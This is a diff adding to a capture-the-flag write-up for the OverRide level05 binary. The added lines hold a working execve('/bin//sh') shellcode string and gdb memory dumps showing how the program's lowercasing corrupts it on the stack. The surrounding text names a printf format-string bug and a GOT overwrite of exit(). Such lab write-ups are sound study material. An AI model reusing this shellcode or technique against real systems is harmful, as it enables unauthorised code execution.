@@ -20,6 +20,37 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 Only one `main()` function is defined in the executable.
 It gets users input, decapitalize and print, following by exit with status 0.
 
+Even though the stack is executable, at the first glance shellcode can be placed in the buffer. But the redirection of the flow to the stack will not work, as the program modify user input.
+```shell
+level05@OverRide:~$ readelf -a level05 | grep STACK
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+```
+```
+SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+```
+```
+Breakpoint 1, 0x0804847a in main ()
+gdb-peda$ x/25wx 0xffffd698
+0xffffd698:     0x080497e0      0x080497e2      0x90909090      0x90909090
+0xffffd6a8:     0x90909090      0x90909090   >>>0x6850c031<<<   0x68732f2f
+0xffffd6b8:     0x69622f68   >>>0x50e3896e<<  >>0xb0e18953<<<   0x2580cd0b
+0xffffd6c8:     0x39383435      0x31257837      0x256e2430      0x39353031
+0xffffd6d8:     0x31257831      0x906e2431      0x90909090      0x90909090
+0xffffd6e8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6f8:     0x00909090
+gdb-peda$ x/25wx 0xffffd698
+gdb-peda$ continue
+Breakpoint 2, 0x08048513 in main ()
+gdb-peda$ x/25wx 0xffffd698
+0xffffd698:     0x080497e0      0x080497e2      0x90909090      0x90909090
+0xffffd6a8:     0x90909090      0x90909090   >>>0x6870c031<<<   0x68732f2f
+0xffffd6b8:     0x69622f68   >>>0x70e3896e<<  >>0xb0e18973<<<   0x2580cd0b
+0xffffd6c8:     0x39383435      0x31257837      0x256e2430      0x39353031
+0xffffd6d8:     0x31257831      0x906e2431      0x90909090      0x90909090
+0xffffd6e8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd6f8:     0x00909090
+```
+
 The issue is that `printf()` is missuded which expose the application to the Format String Attack.
 FSA allows to apply overwrite of GOT table where address of `exit()` is stored.
 
